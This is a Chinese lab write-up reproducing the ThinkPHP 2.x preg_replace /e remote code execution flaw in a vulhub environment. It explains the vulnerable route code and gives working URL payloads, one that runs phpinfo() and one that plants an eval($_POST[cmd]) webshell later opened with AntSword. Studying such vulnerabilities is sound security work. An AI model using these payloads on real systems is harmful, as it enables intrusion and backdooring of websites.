## 复现环境

攻击机：win11

靶机：kali搭建的vulhub

### ThinkPHP影响版本

Thinkphp2.x

### 原理简介

首先了解这个preg_replace()函数:执行一个正则表达式的搜索和替换。

简单来说可以这么理解preg_replace('正则规则','替换字符','目标字符')

假如目标字符被正则规则匹配到，那么就将目标字符替换为替换字符，如果此时正则规则中使用了/e这个修饰符，则存在代码执行漏洞。

e 配合函数preg_replace()使用, 可以把匹配来的字符串当作正则表达式执行;

/e 为可执行模式，此为PHP专有参数。

ThinkPHP 2.x版本中，使用preg_replace的/e模式匹配路由也是漏洞出现的代码：implode($depr,$paths));用户可控

$
preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e','$var[\'\\\1\']="\\\2";',implode($depr,$paths));

导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞。

ThinkPHP 3.0版本因为Lite模式下没有修复该漏洞，也存在这个漏洞

## 复现过程

（1）访问用kali的docker启动的环境 目标机的ip加上端口 例如：192.168.179.140：8080

![](https://image.3001.net/images/20230419/1681900017_643fc1f1e194d746d2a84.png!small)

（2）使用在URL后面加上不存在的路径报错爆处Thinkphp版本，或者看数据包

![](https://image.3001.net/images/20230419/1681900129_643fc261c327203bec63c.png!small)

![](https://image.3001.net/images/20230419/1681900173_643fc28dd96119883a5ab.png!small)

(3) 构造payload实现 phpinfo（）和webshell

payload1：http://xx.xx.xx.xx:8080/index.php?s=/index/index/xxx/${@phpinfo()}

payload2：http://xx.xx.xx.xx.:8080/?s=/Index/index/xxx/${@print(eval($_POST[cmd]))}  
![](https://image.3001.net/images/20230419/1681900209_643fc2b1ac0598b8444e1.png!small)

![](https://image.3001.net/images/20230419/1681900224_643fc2c09f4d640ab32d9.png!small)

（4） 用蚁剑连接后门，获得网站权限

![](https://image.3001.net/images/20230419/1681900258_643fc2e2d3b8781641b43.png!small)

![](https://image.3001.net/images/20230419/1681900268_643fc2ec31c8b60aaf9ed.png!small)

  

